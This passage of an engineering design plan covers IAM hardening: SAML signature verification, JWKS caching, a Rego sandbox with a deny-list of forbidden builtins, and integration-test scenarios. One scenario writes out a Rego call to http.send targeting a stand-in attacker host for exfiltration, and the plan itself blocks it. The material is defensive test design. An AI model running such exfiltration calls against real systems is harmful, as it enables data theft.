| **DEC-W3.1-3** (#40 SAML library choice — **with POC verification**) | **`crewjam/saml` (BSD-2)** — single, well-maintained Go SAML library с поддержкой XML-DSig verify + replay store hook (custom `RequestTracker`). Альтернативы: `russellhaering/gosaml2` (более-low-level, требует ручной XML-DSig wiring). Решение: `crewjam/saml` + кастомный `RequestTracker` который пишет/читает из `saml_request_state` (PostgreSQL-backed, не in-memory как dev-default). Algorithm-allowlist (RS256+) — встроен (отказать `rsa-sha1` явным конфиг-флагом `ServiceProvider.AcceptedResponseSigningAlgorithms = ["rsa-sha256", "rsa-sha384", "rsa-sha512"]`). **POC-verification REQUIRED before locking**: reviewer Important #13 noted that `AcceptedResponseSigningAlgorithms` field name (or equivalent) needs verification in `crewjam/saml@v0.4.x` upstream API. **Impl-action**: 5-line throwaway POC branch (`git checkout -b kac-w3-1-saml-poc` → import library → instantiate `ServiceProvider` → set field → `go build`) confirms API surface before main impl-PR — if field name differs, update plan + (if structural mismatch) raise as Critical against this DEC. |
| **DEC-W3.1-4** (#42 JWKS cache refresh policy) | **Refresh on demand + respect cache-control TTL.** On `Verify` call: if `(idpID, kid)` in cache AND `expires_at > now()` → use cached. Else: fetch JWKS URL → upsert all keys from response with `expires_at = now() + parsed-cache-control-max-age (default 1h)`. Background refresh ticker: every 6h, scan trusted IdPs, refresh JWKS proactively (avoid first-request-after-rotation latency spike). Manual refresh — admin RPC out of W3.1 scope (admin-UI surface is W4); for W3.1 — automatic refresh-on-miss handles compromise scenario (operator deletes cache row via SQL → next verify forces refresh). |
| **DEC-W3.1-5** (REMOVED — was bcrypt cost for #41) | **Removed.** #41 moved to W2.B B.2 per scope split (Option Y); bcrypt cost decision lives in that doc. |
| **DEC-W3.1-6** (#42 ingress — backward compat for unsigned SETs) | **No backward-compat for unsigned/none-alg SETs.** Per CLAUDE.md memory `feedback-no-strict-backward-compat-on-major-rewrite` — W3.1 — production hardening. Current `parseSETBody` accepts `alg: none` (it doesn't verify at all). Once #42 ships: all inbound SETs MUST be signed by a registered trusted IdP. **In-cluster test stubs only** — for local testing, test fixture seeds `iam_trusted_idp_jwks_cache` with a test-IdP's public key paired to a known test-private-key the integration test uses to sign test SETs. Production CAEP subscribers don't exist as inbound clients yet (CAEP ingress is a new feature receiver — there are no «legacy clients» sending us SETs to maintain compatibility with). |
| **DEC-W3.1-7** (#25 cluster-admin source) | **`cluster_admin_grants`-row via existing FGA-grant path (`bootstrap_admin` + W1.5 BreakGlass.ApproveB).** Helper `iam.IsClusterAdmin(ctx, principal_id) bool` — lazy FGA `Check(cluster:default, system_admin, user:<id>)`; cached via gateway authz cache (W1.2 path) с TTL 60s. Не reinvent — переиспользуем W1.5/W1.2/W1.6 infrastructure. |

---

## 4. Open questions (DECISION-NEEDED) — нужно разрешить до старта impl

| ID | Вопрос | Рекомендация автора |
|---|---|---|
| **OQ-W3.1-1** | #40 SAML: support multiple IdPs per tenant (e.g. one tenant federates from Okta + Azure AD одновременно)? Текущий `federation_trust_policies`-table — один row per (tenant_id, idp_id). | **Да, multi-IdP supported уже сейчас** — `federation_trust_policies` PK = `(tenant_id, idp_id)`. W3.1 SAML verify читает IdP cert по `<saml:Issuer>` field из AuthnResponse → выбор правильной row по `(tenant_id, issuer_uri)`. Audit log включает `idp_id` для traceability. |
| **OQ-W3.1-2** | #42: where does `idp_id` come from in the ingress request? Header `X-Kacho-Hook-Source: <idp_id>`? URL path `/iam/v1/hooks/caep/<idp_id>`? JWT `iss` claim cross-referenced to trusted-IdP table? | **JWT `iss` claim cross-referenced** — most secure: extract `iss` claim (post-decode, pre-verify), look up trusted IdP row by `iss` URI, use that row's `jwks_url` + `idp_id`. Avoids spoofable URL/header. If multiple trusted IdPs share `iss` (rare; shouldn't happen with proper IdP setup) — reject as ambiguous. |
| **OQ-W3.1-3** | #42 CAEP: subscriber list (egress side) — out of scope W3.1 (lives in W2.B B.8). Confirmed? | **Confirmed — W2.B B.8 territory.** W3.1 #42 is ingress-only verify (kacho-iam receives SETs from external IdP); subscriber-discovery + push-retry + JWKS publication для нашего ключа — W2.B B.8. |
| **OQ-W3.1-4** | #25 #26: cluster-admin gated на BOTH `ReloadModel` + `RunRegoTest`. Не сужает ли это admin-UI use case (oncall-engineer без cluster-admin grant не может trigger RunRegoTest для diagnostics)? | **Acceptable — diagnostic админ-ops require cluster-admin per KAC-122 §5.** Oncall workflow per runbook: BreakGlass-flow (2-person approve) → temporary cluster-admin grant → diagnostic ops. Если W3.4 (freeze) reveals friction → дополнительный `diagnostic_operator` relation (separate from `system_admin`) — это W4+. W3.1 ставит правильную fail-closed baseline. |
| **OQ-W3.1-5** | #21: bootstrap-seed для `opa_scope_allowlist` — кто populated? Static-seed in migration vs runtime-bootstrap-job? | **Static-seed в migration** — `INSERT INTO opa_scope_allowlist (tenant_id, scope) VALUES (tenant_id='*system', 'data.iam.users'), (...), ...);`. Tenant-specific scopes — admin-UI via future `InternalOpaScopeAllowlistService.Add/Remove` RPCs (out of W3.1 impl scope; W3.1 just provides the table + handler-side check; admin-UI добавляется в W2.A or W4). For W3.1 DoD: well-known scopes seeded + handler enforces — sufficient. |
| **OQ-W3.1-6** | #42: JWKS cache TTL default — 1h, 6h, 24h? Trade-off: shorter → faster IdP rotation propagation; longer → less iam→IdP HTTP load. | **1h default (use cache-control max-age if upstream sends it).** Most IdPs (Okta/Azure/Auth0) send `Cache-Control: max-age=86400` on JWKS endpoints; we respect that ceiling. Background refresh every 6h ensures absolute staleness ≤6h even if upstream sends no cache-control. |
| **OQ-W3.1-7** | #40 SAML replay store: TTL для `saml_request_state` rows? Indefinite (anti-replay forever) or cleanup after `NotOnOrAfter`+max-clock-skew? | **TTL = AuthnRequest issued_at + 10min** (SAML AuthnRequest typically expected to consume within seconds; 10min absorbs slow user / network). Cleanup via daily cron in iam. Reasoning: after row deleted on first successful consume; uncomsumed rows expire after window — no infinite growth. |
| **OQ-W3.1-8** | #42: how is initial trusted-IdP set populated for testing? Seed in migration, or test fixture? | **Test fixture** — `tests/newman/fixtures/caep/seed_trusted_idp.sql` (or equivalent) seeds `iam_trusted_idp_jwks_cache` for test-IdP `idp_test_caep_emitter` whose private key is checked-in under `tests/newman/fixtures/caep/private_key.pem` (test-only key, NEVER deployed to prod). Production: trusted IdPs registered via future admin RPC (out of W3.1 scope) or operator SQL. |
| **OQ-W3.1-9** | #23 OpenFGA Conditions: pass `request_context` as `Context` map (string→`structpb.Value`) directly? | **Yes** — per OpenFGA Conditions SDK reference; `request_context.AsMap()` (from `*structpb.Struct` proto field) is already the right shape; wrap in `Context` arg of `Check`-call. Conditions in FGA model use this map directly: `condition mfa_fresh_required(mfa_fresh: bool) { mfa_fresh == true }` — invoked at Check time against the map. |
| **OQ-W3.1-10** | #26: integration-test для CPU timeout — как deterministically trigger? `while true {}` Rego loop? | **Yes** — fixture Rego module с infinite loop (`x { x }` — recursive eval): in test, `RunRegoTest(module=<loop>, cpu_timeout_ms=100)` — expected `DeadlineExceeded` within 100±50ms. OPA SDK respects `context.Done()` between rule evaluations. |

---

## 5. Implementation steps per finding (impl order)

> Recommended impl order: **independent finds first, glue last.** #21 + #23 — small, isolated. #25 — small, depends on `IsClusterAdmin` helper (existing). #26 — medium, depends on #21 (import allowlist шарит storage). #40 / #42 — independent of each other, parallel.

### 5.21 OPA scope-allowlist (#21)

1. **Migration** `00XX_opa_scope_allowlist.sql` (number next-available at impl-start):
   ```sql
   CREATE TABLE IF NOT EXISTS kacho_iam.opa_scope_allowlist (
     tenant_id  text NOT NULL,
     scope      text NOT NULL,
     created_at timestamptz NOT NULL DEFAULT now(),
     PRIMARY KEY (tenant_id, scope)
   );
   -- bootstrap-seed: well-known catalogued OPA data sources for system tenant.
   INSERT INTO kacho_iam.opa_scope_allowlist (tenant_id, scope) VALUES
     ('*system', 'data.iam.users'),
     ('*system', 'data.iam.roles'),
     ('*system', 'data.iam.bindings'),
     ('*system', 'data.iam.projects')
   ON CONFLICT DO NOTHING;
   ```
2. **Repo** `internal/repo/opa_scope_repo.go`: `IsAllowed(ctx, tenantID, scope) (bool, error)` — `SELECT EXISTS(SELECT 1 FROM opa_scope_allowlist WHERE tenant_id IN ($1, '*system') AND scope=$2)`.
3. **Handler gate** в `internal/apps/kacho/api/internal_authorize/handler.go::RunRegoTest`: для каждой scope-string в `req.GetModuleImports()` — `if !repo.IsAllowed(ctx, callerTenant, scope) { return PermissionDenied("Illegal argument scope: %q not in tenant allowlist", scope) }`. Scope of enforcement is limited to current surface — see DEC-W3.1-1 («Future OPA REST endpoints (`/opa/compile/v1`, `/opa/data/v1/iam/*` if added in some later sub-phase) add their gate at registration time, separately scoped — not W3.1's responsibility»). No forward-reference to hypothetical endpoints in this PR.
4. **Empty-allowlist fail-closed**: separate test — drop seed rows, call `RunRegoTest(module_imports=['data.iam.users'])` → `PermissionDenied`. Doc в handler comment.

### 5.23 CheckRelation OpenFGA Conditions plumbing (#23)

1. **Service** `internal/service/authorize_service.go::CheckRelation`:
   ```go
   var contextMap map[string]interface{}
   if rc := req.GetRequestContext(); rc != nil {
       contextMap = rc.AsMap() // *structpb.Struct → map[string]interface{}
       if len(contextMap) > 32 {
           return nil, status.Error(codes.InvalidArgument,
               "Illegal argument request_context: too many keys (max 32)")
       }
       for k, v := range contextMap {
           if sv, ok := v.(string); ok && len(sv) > 1024 {
               return nil, status.Error(codes.InvalidArgument,
                   "Illegal argument request_context: value for %q exceeds 1KB", k)
           }
       }
   }
   ctxStruct, _ := structpb.NewStruct(contextMap)
   resp, err := s.fga.Check(ctx, &openfgav1.CheckRequest{
       // ... existing fields ...
       Context: ctxStruct, // OpenFGA Conditions feature
   })
   ```
2. **FGA model** (`bootstrap-model.fga` fragment, updated as part of W3.1 PR): add `condition` definitions for known ABAC predicates:
   ```fga
   condition mfa_fresh_required(mfa_fresh: bool) {
       mfa_fresh == true
   }
   condition source_ip_in_corp_range(source_ip: ipaddress) {
       source_ip in CIDR("10.0.0.0/8")
   }
   ```
   And reference them in relation definitions: `define admin: [user with mfa_fresh_required]`.
3. **No proto change** — `request_context` field already exists per KAC-127 frozen proto (`*structpb.Struct` type).

### 5.25 ReloadModel cluster-admin gate (#25)

1. **Handler** `internal/apps/kacho/api/internal_authorize/handler.go::ReloadModel`:
   ```go
   principal := authzguard.PrincipalUserID(ctx)
   if principal == "" {
       return nil, status.Error(codes.PermissionDenied, "authentication required")
   }
   if !h.iam.IsClusterAdmin(ctx, principal) {
       h.audit.Emit(ctx, "iam_admin_reload_model_denied",
           "principal", principal, "outcome", "not_cluster_admin")
       return nil, status.Error(codes.PermissionDenied,
           "ReloadModel requires cluster-admin grant")
   }
   // ... existing modelID swap ...
   h.audit.Emit(ctx, "iam_admin_reload_model_ok",
       "principal", principal, "new_model_id", req.GetModelId())
   ```
2. **Helper** `IsClusterAdmin(ctx, principal) bool` — DEC-W3.1-7; реализация via FGA `Check(cluster:default, system_admin, user:<id>)`.
3. **Audit-log shape**: `event:` + `principal:` + `outcome:` — structured slog. Wired to existing audit-outbox path.

### 5.26 RunRegoTest sandbox (#26)

1. **Proto** `kacho/cloud/iam/v1/internal_authorize_service.proto`: `RunRegoTestRequest` add fields `module_imports[]` (`repeated string`), `cpu_timeout_ms` (`uint32`, default 5000); `RunRegoTestResponse` add `denied_reason` (`string`, empty if eval ran).
2. **Cluster-admin gate** — same pattern as #25 (`h.iam.IsClusterAdmin`).
3. **Sandbox**:
   ```go
   // (a) Parse AST, walk for forbidden built-ins.
   mod, err := ast.ParseModule("user-test.rego", req.GetRego())
   if err != nil { return nil, InvalidArgument("Rego parse failed: %v", err) }
   if forbidden := walkForForbiddenBuiltins(mod); forbidden != "" {
       return &iamv1.RunRegoTestResponse{
           Allowed: false, DeniedReason: fmt.Sprintf("forbidden builtin: %s", forbidden),
       }, nil
   }
   // (b) Module import allowlist.
   for _, imp := range req.GetModuleImports() {
       if ok, _ := h.opaScope.IsAllowed(ctx, callerTenant, imp); !ok {
           return &iamv1.RunRegoTestResponse{
               Allowed: false, DeniedReason: fmt.Sprintf("import %q not in scope allowlist", imp),
           }, nil
       }
   }
   // (c) CPU timeout.
   cpuMs := req.GetCpuTimeoutMs(); if cpuMs == 0 || cpuMs > 5000 { cpuMs = 5000 }
   evalCtx, cancel := context.WithTimeout(ctx, time.Duration(cpuMs) * time.Millisecond)
   defer cancel()
   // (d) Iteration cap (proxy for memory pressure — see DEC-W3.1-2).
   r := rego.New(rego.Module("user-test.rego", req.GetRego()),
       rego.Query("data.user.test.allow"),
       rego.PrintHook(nil),
       rego.RuntimeOpts(rego.RegoMaxIterations(100_000)))
   rs, err := r.Eval(evalCtx)
   if errors.Is(err, context.DeadlineExceeded) {
       return &iamv1.RunRegoTestResponse{
           Allowed: false, DeniedReason: "cpu_timeout_exceeded",
       }, nil
   }
   // ... normal result handling ...
   ```
4. **`walkForForbiddenBuiltins`** helper: traverse Rego AST via `ast.WalkExprs`, check `Expr.Operator()` name against deny-list set. Return name of first match.

   **Forbidden builtins (W3.1 — tightened list, with per-builtin rationale per reviewer Important #7)**:

   | Builtin | Why forbidden |
   |---|---|
   | `http.send` | Network egress — allows exfiltration to arbitrary URLs |
   | `net.lookup_ip_addr` | DNS resolution — leaks hostname to external resolver, fingerprints internal network |
   | `opa.runtime` | Reflects OPA runtime configuration / env vars — information disclosure |
   | `time.now_ns` | Non-deterministic — different result on each call breaks test reproducibility and admin diagnostics |
   | `rand.*` (all `rand.intn`, `rand.bytes`, etc) | Non-deterministic — same reason as `time.now_ns` |
   | File-system builtins (`opa.io.file_read`, `opa.io.file_write` if present in SDK) | Local I/O — escape sandbox to host FS |

   **Explicitly ALLOWED (NOT forbidden — pure computation, no I/O, deterministic)**:
   - `io.jwt.decode` — pure JWT base64-decode + JSON-parse, no network, no I/O. Useful for token-inspection diagnostics.
   - `io.jwt.verify_*` — pure cryptographic verification of supplied key (key passed as data input, not fetched). Deterministic.
   - `crypto.hmac.*` (sha256, sha512, etc) — pure HMAC computation. No I/O.
   - `crypto.x509.parse_*` — pure parsing of supplied certificate bytes. No I/O.
   - `base64.encode/decode`, `urlquery.*`, `json.marshal/unmarshal` — pure transforms.

   Rationale doc-block in `walkForForbiddenBuiltins` source code documents this list.

### 5.40 SAML AuthnResponse verify + replay state (#40)

1. **Migration** `00XX_saml_request_state.sql` (number next-available; **moved from W2.B per scope split — now meaningful in W3.1 with signature verify present**):
   ```sql
   CREATE TABLE IF NOT EXISTS kacho_iam.saml_request_state (
     request_id    text PRIMARY KEY,           -- <samlp:AuthnRequest>.ID issued by us
     tenant_id     text NOT NULL REFERENCES kacho_iam.accounts(id) ON DELETE CASCADE,
     idp_id        text NOT NULL,
     issued_at     timestamptz NOT NULL DEFAULT now(),
     expires_at    timestamptz NOT NULL,       -- issued_at + 10min per OQ-W3.1-7
     relay_state   text                        -- opaque app-state passed through
   );
   CREATE INDEX saml_request_state_cleanup_idx ON kacho_iam.saml_request_state (expires_at);
   ```
2. **Handler** `internal/apps/kacho/api/saml/sp_handler.go` — заменить `OnSAMLAssertion: nil` (W2.B B.1 501) на:
   ```go
   sp := &saml.ServiceProvider{
       EntityID:    cfg.AcsURL,
       AcsURL:      mustParseURL(cfg.AcsURL),
       IDPMetadata: loadIDPMetadata(ctx, tenantID, idpID),
       AcceptedResponseSigningAlgorithms: []string{
           "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256",
           "http://www.w3.org/2001/04/xmldsig-more#rsa-sha384",
           "http://www.w3.org/2001/04/xmldsig-more#rsa-sha512",
       },
       RequestTracker: postgresReplayTracker{db: h.db, tenantID: tenantID},
       Clock:          systemClock{},
   }
   assertion, err := sp.ParseResponse(req, []string{relayState.RequestID})
   if err != nil {
       h.audit.Emit(ctx, "saml_signature_invalid",
           "tenant", tenantID, "idp", idpID, "err", err.Error())
       http.Error(w, "SAML response verification failed", http.StatusUnauthorized)
       return
   }
   // JIT-provision via UserService.Create (existing path, returns Operation)
   ```
   **POC verification before locking on `AcceptedResponseSigningAlgorithms` field name** (per DEC-W3.1-3) — confirms upstream API surface.
3. **`postgresReplayTracker`** implements `crewjam/saml.RequestTracker` interface; `TrackRequest` → INSERT replay-row at AuthnRequest issuance; `GetTrackedRequests` checks `WHERE request_id = $1 AND expires_at > now()`; `StopTrackingRequest` → DELETE row (atomic single-use).
4. **Audit**: events `saml_signature_invalid`, `saml_replay_rejected`, `saml_recipient_mismatch`, `saml_audience_mismatch`, `saml_not_on_or_after_expired`, `saml_not_before_future`, `saml_assertion_not_signed`, `saml_jit_provisioned_ok` — все с `tenant`+`idp`+`subject` (subject only on success — on fail just hashed-form fingerprint to avoid logging arbitrary attacker input).

### 5.42 CAEP SET ingress verify (#42)

1. **Migration** `00XX_iam_trusted_idp_jwks_cache.sql` (number next-available):
   ```sql
   CREATE TABLE IF NOT EXISTS kacho_iam.iam_trusted_idp_jwks_cache (
     idp_id         text NOT NULL,             -- e.g. 'okta-prod', 'azure-tenant-xxx'
     kid            text NOT NULL,             -- key ID from upstream JWKS
     alg            text NOT NULL,             -- e.g. 'RS256', 'ES256'
     public_key_pem text NOT NULL,
     fetched_at     timestamptz NOT NULL DEFAULT now(),
     expires_at     timestamptz NOT NULL,      -- per upstream Cache-Control max-age or default 1h
     PRIMARY KEY (idp_id, kid)
   );
   CREATE INDEX iam_trusted_idp_jwks_cache_expires_idx
     ON kacho_iam.iam_trusted_idp_jwks_cache (expires_at);
   -- iss_uri → idp_id lookup helper table (per OQ-W3.1-2 «JWT iss claim cross-referenced»):
   CREATE TABLE IF NOT EXISTS kacho_iam.iam_trusted_idp_registry (
     idp_id     text PRIMARY KEY,
     iss_uri    text NOT NULL UNIQUE,
     jwks_url   text NOT NULL,
     created_at timestamptz NOT NULL DEFAULT now()
   );
   ```
2. **New package** `internal/service/jwks_verifier/`:
   - `FetchAndCache(ctx, idpID, jwksURL) error` — HTTP GET against `jwksURL`, parse JWK set per RFC 7517, UPSERT each key into `iam_trusted_idp_jwks_cache` with `expires_at = now() + parsed-Cache-Control max-age (default 1h per DEC-W3.1-4)`.
   - `Verify(ctx, idpID string, tokenStr string) (jwt.MapClaims, error)`:
     1. Parse JWS header without verifying (extract `kid`, `alg`).
     2. Assert `alg` in asymmetric allowlist: `RS256`, `RS384`, `RS512`, `ES256`, `ES384`, `ES512`. Reject `none`, `HS256`/`HS384`/`HS512` (symmetric — would require sharing private key with upstream, never our model).
     3. Look up `(idpID, kid)` in cache. If miss → call `FetchAndCache(ctx, idpID, lookupJwksURL(idpID))` once → retry lookup. If still miss → reject with `caep_ingress_unknown_kid`.
     4. Verify JWS signature against retrieved public key. On failure → reject with `caep_ingress_signature_invalid`.
     5. Return parsed claims.
3. **Integration into `parseSETBody`** (`internal/handler/iamhooks/caep_ingress_handler.go`):
   - Replace current «base64-декодим payload без verification» logic with:
     ```go
     // Pre-verify peek to extract iss for IdP lookup (per OQ-W3.1-2).
     unverifiedClaims, err := jwt.Parse(tokenStr, nil, jwt.WithoutClaimsValidation())
     if err != nil { return nil, "", fmt.Errorf("malformed SET: %w", err) }
     iss, _ := unverifiedClaims.Claims.(jwt.MapClaims)["iss"].(string)
     idp, err := h.idpRegistry.GetByIssUri(ctx, iss)
     if err != nil {
         h.audit.Emit(ctx, "caep_ingress_unknown_issuer", "iss", iss)
         return nil, "", fmt.Errorf("unknown SET issuer: %s", iss)
     }
     // Now verify.
     claims, err := h.jwksVerifier.Verify(ctx, idp.IdpID, tokenStr)
     if err != nil {
         h.audit.Emit(ctx, "caep_ingress_signature_invalid",
             "idp_id", idp.IdpID, "iss", iss, "err", err.Error())
         return nil, "", err
     }
     // Continue with verified claims — extract events, sub_id, emit subject_change_outbox row.
     ```
4. **Audit events**: `caep_ingress_signature_invalid`, `caep_ingress_unknown_issuer`, `caep_ingress_unknown_kid`, `caep_ingress_weak_alg`, `caep_ingress_jwks_fetch_failed`, `caep_ingress_verified_ok` — all with `idp_id`, `iss`, `err` (no raw token body — avoid log injection).
5. **Trusted IdP test fixture**: `tests/newman/fixtures/caep/seed_trusted_idp.sql` (and corresponding integration test fixture) seeds `iam_trusted_idp_registry` + `iam_trusted_idp_jwks_cache` rows for a synthetic test IdP `idp_test_caep_emitter`; test private key in `tests/newman/fixtures/caep/test_idp_private_key.pem` (test-only, never deployed; readme.md warns).
6. **No new publication of OUR keys.** W2.B B.8 owns `/.well-known/jwks.json` exposure for OUR egress signing keys; W3.1 does not touch that endpoint. If reviewer flags concern about hypothetical cross-use of our private key against the wrong path — `jwks_verifier.Verify` never accesses `oidc_jwks_keys` table; the two paths are physically separated (different packages, different DB tables).

---

## 6. Сценарии (Given-When-Then) — основа интеграционных тестов

> All scenarios assume: Postgres testcontainer with migrations 0001-current applied; OpenFGA testcontainer with bootstrap-model (extended with Conditions for #23) loaded; iam-server stood up via bufconn with all middlewares (anti-anon W1.6, authz-guard, audit-outbox) mounted. SAML scenarios use `crewjam/saml` test-fixtures; CAEP scenarios use synthetic test IdP keypair (test fixture).

### 6.21 OPA scope-allowlist (#21)

#### Scenario W3.1-21-HAPPY — allowlisted scope → eval proceeds

**ID**: W3.1-21-HAPPY

**Given** `opa_scope_allowlist` seeded with `(*system, data.iam.users)`
**And** principal `usr_cluster_admin` has cluster-admin grant (W1.5 BG.ApproveB path)
**And** ctx contains tenant `acc_t1`

**When** `InternalAuthorizeService.RunRegoTest(rego=<noop module that returns true>, module_imports=["data.iam.users"], cpu_timeout_ms=1000)`

**Then** response `Allowed=true`, `DeniedReason=""`
**And** audit log emits `event: iam_admin_run_rego_test_ok`

---

#### Scenario W3.1-21-UNKNOWN-SCOPE — non-allowlisted scope → 403

**ID**: W3.1-21-UNKNOWN

**Given** allowlist seeded with `data.iam.users` only
**And** principal is cluster-admin

**When** `RunRegoTest(module_imports=["data.attacker_controlled.malicious"])`

**Then** response `Allowed=false, DeniedReason='import "data.attacker_controlled.malicious" not in scope allowlist'`
**And** structured log `event: opa_scope_not_allowlisted, scope: "data.attacker_controlled.malicious"`

---

#### Scenario W3.1-21-EMPTY-ALLOWLIST-FAIL-CLOSED — mis-bootstrap → deny all

**ID**: W3.1-21-EMPTY-FAIL-CLOSED

**Given** `opa_scope_allowlist` is empty (test deletes all rows after migration)
**And** principal is cluster-admin

**When** `RunRegoTest(module_imports=["data.iam.users"])`

**Then** response `Allowed=false, DeniedReason='import "data.iam.users" not in scope allowlist'`
**And** test asserts NO empty-allowlist-equals-allow-all bypass exists (regression-prevention)

---

### 6.23 CheckRelation OpenFGA Conditions (#23)

#### Scenario W3.1-23-HAPPY-MFA — conditional binding with MFA context → allow

**ID**: W3.1-23-HAPPY

**Given** FGA model contains `condition mfa_fresh_required(mfa_fresh: bool) { mfa_fresh == true }`
**And** AccessBinding `acb_x` granting user `usr_admin` admin on `project:prj_y` via relation `admin: [user with mfa_fresh_required]`
**And** ctx contains principal `usr_admin`

**When** `InternalIAMService.CheckRelation(subject="user:usr_admin", relation="admin", object="project:prj_y", request_context={"mfa_fresh":true,"source_ip":"10.0.0.5"})`

**Then** response `Allowed=true`
**And** FGA Check was called with `Context` containing `{mfa_fresh: true, source_ip: "10.0.0.5"}` (verified via mock OpenFGA SDK capture)

---

#### Scenario W3.1-23-CONTEXT-DENY — same binding, mfa_fresh=false in context → deny

**ID**: W3.1-23-CONTEXT-DENY

Same setup as W3.1-23-HAPPY:

**When** `CheckRelation(..., request_context={"mfa_fresh":false,"source_ip":"10.0.0.5"})`

**Then** response `Allowed=false`
**And** condition `mfa_fresh_required` evaluated to false (proves Context plumbed correctly — pre-W3.1: always deny because field ignored; post-W3.1: deny only when condition not met)

---

#### Scenario W3.1-23-MALFORMED-OVERSIZE — oversized request_context → InvalidArgument

**ID**: W3.1-23-MALFORMED-SIZE

**Given** principal authenticated

**When** `CheckRelation(..., request_context=<33-key map>)` (exceeds 32-key cap per §5.23)

**Then** returns `codes.InvalidArgument` with text containing `"Illegal argument request_context"`

---

#### Scenario W3.1-23-MALFORMED-VALUE — oversized value → InvalidArgument

**ID**: W3.1-23-MALFORMED-VALUE

**When** `CheckRelation(..., request_context={"big": <1025-byte string>})` (exceeds 1KB cap)

**Then** returns `codes.InvalidArgument` with text containing `"value for \"big\" exceeds 1KB"`

---

### 6.25 ReloadModel cluster-admin gate (#25)

#### Scenario W3.1-25-HAPPY — cluster-admin reloads model → version bump

**ID**: W3.1-25-HAPPY

**Given** principal `usr_cluster_admin` has cluster-admin grant
**And** current `modelID` = "01H...A"
**And** new model written to OpenFGA returning `modelID` = "01H...B"

**When** `InternalAuthorizeService.ReloadModel(model_id="01H...B")`

**Then** response 200 OK, `currentModelID` mutated to "01H...B"
**And** subsequent `AuthorizeService.Check` uses "01H...B" model (verified by mocked OpenFGA client)
**And** audit log emits `event: iam_admin_reload_model_ok, principal: usr_cluster_admin, new_model_id: 01H...B`

---

#### Scenario W3.1-25-ANON-DENY — anonymous ReloadModel → 401

**ID**: W3.1-25-ANON-DENY

**Given** ctx is anonymous (no principal in context)

**When** `ReloadModel(model_id="01H...B")`

**Then** returns `codes.PermissionDenied` with text `"authentication required"`
**And** `currentModelID` NOT mutated (verified)
**And** anti-anon interceptor (W1.6) fired BEFORE handler reached (verified via interceptor metric)

---

#### Scenario W3.1-25-NON-ADMIN-DENY — authenticated non-admin → 403

**ID**: W3.1-25-NON-ADMIN

**Given** principal `usr_regular` is authenticated but has no cluster-admin grant

**When** `ReloadModel(model_id="01H...B")`

**Then** returns `codes.PermissionDenied` with text `"ReloadModel requires cluster-admin grant"`
**And** audit log emits `event: iam_admin_reload_model_denied, principal: usr_regular, outcome: not_cluster_admin`
**And** `currentModelID` NOT mutated

---

### 6.26 RunRegoTest sandbox (#26)

#### Scenario W3.1-26-HAPPY — bounded Rego eval → returns result

**ID**: W3.1-26-HAPPY

**Given** cluster-admin principal; allowlist seeded
**And** module: `package user.test; allow { data.iam.users[_].active == true }`

**When** `RunRegoTest(rego=<module>, module_imports=["data.iam.users"], cpu_timeout_ms=2000)`

**Then** response `Allowed=true` (assuming seed data has active user)
**And** `DeniedReason=""`

---

#### Scenario W3.1-26-FORBIDDEN-HTTP — http.send → reject at parse-time

**ID**: W3.1-26-FORBIDDEN-HTTP

**Given** cluster-admin principal
**And** module: `package user.test; allow { http.send({"method":"GET","url":"http://attacker.local/exfil"}) }`

**When** `RunRegoTest(rego=<module>, ...)`

**Then** response `Allowed=false, DeniedReason="forbidden builtin: http.send"`
**And** structured log `event: rego_sandbox_blocked, builtin: http.send`
**And** no outbound HTTP request to `attacker.local` was made (verified via test-stub network monitor)

---

#### Scenario W3.1-26-FORBIDDEN-BUILTINS-TABLE — all forbidden builtins rejected

**ID**: W3.1-26-FORBIDDEN-TABLE

**Given** cluster-admin principal

Table test, one Rego module per row:

| Module fragment | Expected DeniedReason |
|---|---|
| `allow { http.send({...}) }` | `forbidden builtin: http.send` |
| `allow { net.lookup_ip_addr("x") }` | `forbidden builtin: net.lookup_ip_addr` |
| `allow { opa.runtime() }` | `forbidden builtin: opa.runtime` |
| `allow { time.now_ns() > 0 }` | `forbidden builtin: time.now_ns` |
| `allow { rand.intn("seed", 100) > 0 }` | `forbidden builtin: rand.intn` |

**Then** each row returns `Allowed=false, DeniedReason=<expected>`

---

#### Scenario W3.1-26-ALLOWED-PURE-BUILTINS — pure-computation builtins allowed

**ID**: W3.1-26-ALLOWED-PURE

**Given** cluster-admin principal; allowlist seeded with `data.iam.users`

Table test:

| Module fragment | Expected outcome |
|---|---|
| `allow { io.jwt.decode(input.token)[0].alg == "RS256" }` | eval proceeds (no `DeniedReason`); result depends on input |
| `allow { crypto.hmac.sha256("k", "m") != "" }` | `Allowed=true` (pure HMAC computation) |
| `allow { base64.encode("x") == "eA==" }` | `Allowed=true` |

**Then** none rejected at parse-time; eval proceeds; explicit confirmation that allow-list change in §5.26 didn't accidentally forbid them

---

#### Scenario W3.1-26-CPU-TIMEOUT — infinite loop module → DeadlineExceeded → 403

**ID**: W3.1-26-CPU-TIMEOUT

**Given** cluster-admin principal
**And** module: `package user.test; allow { x }; x { x }` (recursive eval per OQ-W3.1-10)

**When** `RunRegoTest(rego=<module>, cpu_timeout_ms=100)`

**Then** response `Allowed=false, DeniedReason="cpu_timeout_exceeded"`
**And** elapsed time ≤ 150ms (i.e. timeout actually fired, not test-harness timeout)

---

#### Scenario W3.1-26-UNKNOWN-IMPORT — import not in allowlist → 403

**ID**: W3.1-26-UNKNOWN-IMPORT

**Given** allowlist = {`data.iam.users`}; module imports `data.iam.secrets` (not in list)

**When** `RunRegoTest(rego=<module>, module_imports=["data.iam.secrets"])`

**Then** response `Allowed=false, DeniedReason='import "data.iam.secrets" not in scope allowlist'`

---

#### Scenario W3.1-26-NON-ADMIN-DENY — non-cluster-admin → 403 (parity with #25)

**ID**: W3.1-26-NON-ADMIN

Symmetric to W3.1-25-NON-ADMIN. Authenticated non-admin → `PermissionDenied("RunRegoTest requires cluster-admin grant")`.

---

### 6.40 SAML AuthnResponse verify (#40)

#### Scenario W3.1-40-HAPPY — trusted IdP cert + valid signature → JIT user

**ID**: W3.1-40-HAPPY

**Given** Tenant `acc_t40` has `federation_trust_policies` row for IdP `idp_okta_test` with cert `<test-cert.pem>`
**And** AuthnRequest issued earlier (row in `saml_request_state` with `request_id=req_42`, `expires_at=now+10min`)
**And** Test fixture signs Response with corresponding private key, sets `InResponseTo=req_42`, `NotBefore=now-1m`, `NotOnOrAfter=now+5min`, `Recipient=<our ACS URL>`, `Audience=<our SP entity ID>`
**And** Signature algorithm = `rsa-sha256`; both `<samlp:Response>` and `<saml:Assertion>` signed

**When** POST `/saml/v2/acs?tenant=acc_t40&idp=idp_okta_test` with the signed Response

**Then** HTTP 302 redirect to post-login URL
